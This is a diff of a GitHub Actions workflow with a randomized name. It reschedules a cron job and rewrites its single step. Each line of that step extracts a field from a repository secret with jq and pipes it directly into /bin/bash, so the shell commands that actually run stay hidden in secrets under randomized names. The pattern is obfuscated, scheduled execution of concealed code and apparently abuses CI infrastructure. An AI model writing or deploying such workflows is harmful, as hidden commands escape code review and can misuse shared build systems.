@@ -2,28 +2,19 @@ name: baiqiangda4390
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 2/6 * * *'
+    - cron: '42 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: baiqiangda4390
         env:
-          gv49: ${{ secrets.gv49 }}
+          nys79: ${{ secrets.nys79 }}
         run: |
-          echo $gv49 | jq -r .j81 | /bin/bash
-          echo $ioz0834 | jq -r .u6898 | /bin/bash
-          echo $xoj53985 | jq -r .i839 | /bin/bash
-          echo $wqyx51534 | jq -r .sjr8974 | /bin/bash
-          echo $fh6 | jq -r .vaz76097 | /bin/bash
-          echo $f9269 | jq -r .aq93289 | /bin/bash
-          echo $tgra4 | jq -r .waqv90230 | /bin/bash
-          echo $z1 | jq -r .jymvu309 | /bin/bash
-          echo $wuydp243 | jq -r .fchwm227 | /bin/bash
-          echo $fkpn49 | jq -r .bg30 | /bin/bash
-          echo $gkeow7856 | jq -r .pejl9 | /bin/bash
-          echo $u43 | jq -r .jo68035 | /bin/bash
+          echo $nys79 | jq -r .drpz20426 | /bin/bash
+          echo $rt0 | jq -r .nrks1925 | /bin/bash
+          echo $adzxd5 | jq -r .ssw7 | /bin/bash
+          echo $jvdhi4 | jq -r .u7 | /bin/bash
 
